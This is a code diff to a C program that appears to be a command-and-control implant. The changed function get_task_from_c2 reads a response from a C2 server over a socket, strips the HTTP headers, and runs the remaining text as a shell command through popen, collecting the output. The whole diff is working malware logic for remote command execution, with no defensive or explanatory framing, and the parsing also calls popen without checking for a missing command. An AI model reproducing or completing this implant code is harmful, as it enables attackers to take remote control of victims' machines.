@@ -45,11 +45,42 @@ void get_task_from_c2(char* task) {
     } 
     printf("[+] Get request send to c2.\n");
 
-    if(read(sockfd, request, sizeof(request)) == -1) {
+    int count_bytes = read(sockfd, request, sizeof(request));
+    if(count_bytes == -1) {
         error_exit("read");
         exit(EXIT_FAILURE);
     }
-    printf("[+] Answer from c2: %s\n", request);
+    printf("[+] Answer from c2:\n %s\n\n", request);
+    fflush(stdout);
+
+    //for reliability and rewrite the last character '"'
+    request[count_bytes - 1] = '\0';
+    
+    //parse
+    char* command = strstr(request, "\r\n\r\n");
+    if(command != NULL) {
+        command += 5; //because '"'
+    }
+
+    sleep(1);
+    
+    FILE* fp;
+    char chunk[256];
+    char result[4096] = {0};
+    
+    fp = popen(command, "r");
+    if(fp == NULL) {
+        error_exit("popen");
+        exit(EXIT_FAILURE);
+    } 
+
+    while(fgets(chunk, sizeof(chunk), fp) != NULL) {
+        strncat(result, chunk, sizeof(result) - strlen(result) - 1);
+    }
+
+    pclose(fp);
+
+    printf("%s\n", result);
 }
 
 int main() {
